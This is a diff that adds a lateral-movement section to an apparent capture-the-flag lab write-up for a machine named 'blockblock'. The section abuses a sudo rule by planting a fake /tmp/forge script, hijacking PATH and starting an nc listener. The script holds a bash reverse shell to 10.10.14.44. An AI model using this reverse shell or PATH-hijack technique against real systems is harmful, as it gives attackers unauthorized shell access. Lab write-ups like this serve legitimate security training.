@@ -1156,3 +1156,48 @@ Last login: Mon Nov 18 16:50:13 2024 from 10.10.14.23
 [keira@blockblock ~]$ cat /home/keira/user.txt
 10133cfbede7721a372137ea79ad6e35
 ```
+
+## 5. Lateral Movement
+
+### 5.1. Discover movement to `paul`
+
+Listing `keira`'s `sudo` rights reveals she can run `/home/paul/.foundry/bin/forge` as `paul` without password
+
+```console
+keira@blockblock ~]$ sudo -l
+User keira may run the following commands on blockblock:
+    (paul : paul) NOPASSWD: /home/paul/.foundry/bin/forge
+```
+
+### 5.2. Abusing the `sudo` rights
+
+Prepare bash script to connect reverse shell to Kali:
+
+```sh
+cat << EOF > /tmp/forge
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.44/4444 0>&1
+EOF
+```
+
+Setup permission to allow anyone to run the script:
+
+```sh
+chmod 777 /tmp/forge
+```
+
+Put `/tmp` in `$PATH`
+
+```sh
+export PATH=/tmp:$PATH
+```
+
+Start listener on Kali:
+
+```sh
+rlwrap nc -nlvp 4444
+```
+
+```sh
+sudo -u paul /home/paul/.foundry/bin/forge completions bash
+```
